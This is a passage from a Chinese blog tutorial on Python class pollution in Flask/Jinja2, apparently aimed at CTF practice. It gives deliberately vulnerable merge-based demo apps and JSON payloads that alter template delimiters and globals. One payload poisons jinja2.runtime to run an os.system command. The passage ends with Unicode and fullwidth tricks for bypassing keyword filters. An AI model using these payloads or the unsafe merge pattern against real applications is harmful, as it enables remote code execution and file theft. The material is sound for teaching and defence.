<p>而在<code>Flask</code>中使用了<code>Flask</code>类（<code>Lib/site-packages/flask/app.py</code>）的装饰器装饰后的<code>jinja_env</code>方法实现上述的功能；</p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105211530-505675831.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105211530-505675831.png"
                      alt="img"
                ></a></p>
<p>经过装饰器的装饰后，简单来说可以将该方法视为属性，对该方法的获取就能实现方法调用，类似<code>Flask.jinja_env</code>就相当于<code>Flask.jinja_env()</code>。</p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105219514-2070062201.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105219514-2070062201.png"
                      alt="img"
                ></a></p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105225947-1658688272.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105225947-1658688272.png"
                      alt="img"
                ></a></p>
<p>跟进其中调用的<code>create_jinja_environment</code>，结合注释就可以发现<code>jinja_env</code>方法返回值就是<code>Jinja</code>中的环境类（实际上是对原生的<code>Jinja</code>环境类做了继承，不过在使用上并无多大区别），所以我们可以直接采用类似<code>Flask.jinja_env.variable_start_string = &quot;xxx&quot;</code>来实现对<code>Jinja</code>语法标识符进行替换</p>
<p>模拟的环境如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#templates/index.html#&#125;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;Look this -&gt; [[flag]] &lt;- try to make it become the real flag&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>app.py</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;go check /index before merge it&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>按照之前想的，使用payload</p>
<h6 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h6><p>（需要在访问对应页面前进行）</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;jinja_env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;variable_start_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[[&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;variable_end_string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;]]&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>传入后，再去访问index，实际情况是内容并没有按我们想要的渲染，发现<code>flag</code>值还是没有被填充进来，也就是语法标识符没有被解析，而还是之前的样子</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111223832722.png"
                      alt="image-20240111223832722"
                ></p>
<p><code>Flask</code>默认会对一定数量内的模板文件编译渲染后进行缓存，下次访问时若有缓存则会优先渲染缓存，所以输入<code>payload</code>污染之后虽然语法标识符被替换了，但渲染的内容还是按照污染前语生成的缓存，由于缓存编译时并没有存在<code>flag</code>变量，所以自然没有被填充<code>flag</code>。关于模板缓存的相关设置也可以在<code>Jinja</code>的环境类中设定，在刚才上面<code>Jinja</code>的官方文档链接稍微下方点的位置介绍了这个值。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111224122360.png"
                      alt="image-20240111224122360"
                ></p>
<p>这个值在environment创建时被初始化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111233418876.png"
                      alt="image-20240111233418876"
                ></p>
<p>这个变量与之前的 variable_start_string 有点不同，它在 LRUCache 对象中，这个变量在通过merge函数进行操作时，没有获取到capacity元素的值，于是就创建了一个“capacity”，这和之前的不一样（同理，想要修改它的<code>_mapping</code>也是不行的），而且就算修改了capacity的值也没有作用，缓存如果在的话，访问对应网页也会加载，而不会判断当前缓存是否已满。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111233839788.png"
                      alt="image-20240111233839788"
                ></p>
<p>所以需要我们在<code>Flask</code>服务启动后（当然这里演示就是重启下<code>Flask</code>服务就行了，对于题目来说一般就是重启容器，或是在污染之后再访问模板）先输入<code>payload</code>再访问<code>index</code>路由即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111235354521.png"
                      alt="image-20240111235354521"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111235435916.png"
                      alt="image-20240111235435916"
                ></p>
<h5 id="Jinja语法全局数据"><a href="#Jinja语法全局数据" class="headerlink" title="Jinja语法全局数据"></a><code>Jinja</code>语法全局数据</h5><p>实际上包括函数、变量、过滤器这三者都能被自定义的添加到<code>Jinja</code>语法解析时的环境，操作方式于<code>Jinja</code>语法标识符中完全类似</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105320194-987334030.png"
                      alt="img"
                ></p>
<p>这里以增加变量为例子给出模拟的环境如下：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">&#123;#templates/index.html#&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;flag if permission else &quot;No way!&quot;&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>app.py</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>直接访问会由于没有设定<code>permission</code>值导致<code>if</code>条件为假返回<code>No way!</code>而不是<code>flag</code></p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105334386-1640095407.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105334386-1640095407.png"
                      alt="img"
                ></a></p>
<p>所以将其赋值为任意逻辑非空值让条件为真即可</p>
<h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;__init__&quot;: &#123;</span><br><span class="line">    &quot;__globals__&quot;: &#123;</span><br><span class="line">      &quot;app&quot;: &#123;</span><br><span class="line">        &quot;jinja_env&quot;: &#123;</span><br><span class="line">          &quot;globals&quot;:&#123;</span><br><span class="line">            &quot;permission&quot;: true</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111235925462.png"
                      alt="image-20240111235925462"
                ></p>
<h5 id="模板编译时的变量"><a href="#模板编译时的变量" class="headerlink" title="模板编译时的变量"></a>模板编译时的变量</h5><p>在<code>flask</code>中如使用<code>render_template</code>渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的<code>Jinja</code>语法进行解析转化为<code>AST</code>，而在语法树的根部即<code>Lib/site-packages/jinja2/compiler.py</code>中<code>CodeGenerator</code>类的<code>visit_Template</code>方法纯在一段有趣的逻辑</p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105350870-1852736359.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105350870-1852736359.png"
                      alt="img"
                ></a></p>
<p>该逻辑会向输出流写入一段拼接的代码（输出流中代码最终会被编译进而执行），注意其中的<code>exported_names</code>变量，该变量为<code>.runtime</code>模块（即<code>Lib/site-packages/jinja2/runtime.py</code>）中导入的变量<code>exported</code>和<code>async_exported</code>组合后得到，这就意味着我们可以通过污染<code>.runtime</code>模块中这两个变量实现RCE。由于这段逻辑是模板文件解析过程中必经的步骤之一，所以这就意味着只要渲染任意的文件均能通过污染这两属性实现RCE。</p>
<p>给出模拟的环境如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#templates/index.html#&#125;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;nt here~&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>app.py</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>进行<code>RCE</code>将<code>flag</code>写入<code>static</code>目录中</p>
<h6 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h6><p>这是windows执行的移动文件的命令，linux做适当修改</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;copy .\\\\flag .\\\\static\\\\flag&#x27;);#&quot;</span><span class="punctuation">]</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>但是需要注意插入<code>payload</code>的位置是AST的根部分，是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的<code>payload</code><strong>只会在模板在第一次访问时触发，所以请在模板加载之前进行注入</strong></p>
<p>然后就能在<code>static</code>目录下读取到<code>flag</code>了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240112001153809.png"
                      alt="image-20240112001153809"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240112001211302.png"
                      alt="image-20240112001211302"
                ></p>
<h2 id="关键字过绕过"><a href="#关键字过绕过" class="headerlink" title="关键字过绕过"></a>关键字过绕过</h2><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__init__</span><br><span class="line">\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F</span><br></pre></td></tr></table></figure></div>



<h3 id="全角半角"><a href="#全角半角" class="headerlink" title="全角半角"></a>全角半角</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</span><br><span class="line">𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵</span><br><span class="line">０１２３４５６７８９</span><br><span class="line">𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻</span><br><span class="line">𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</span><br><span class="line">＿</span><br></pre></td></tr></table></figure></div>









































]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python 漏洞</tag>
      </tags>
  </entry>
</search>
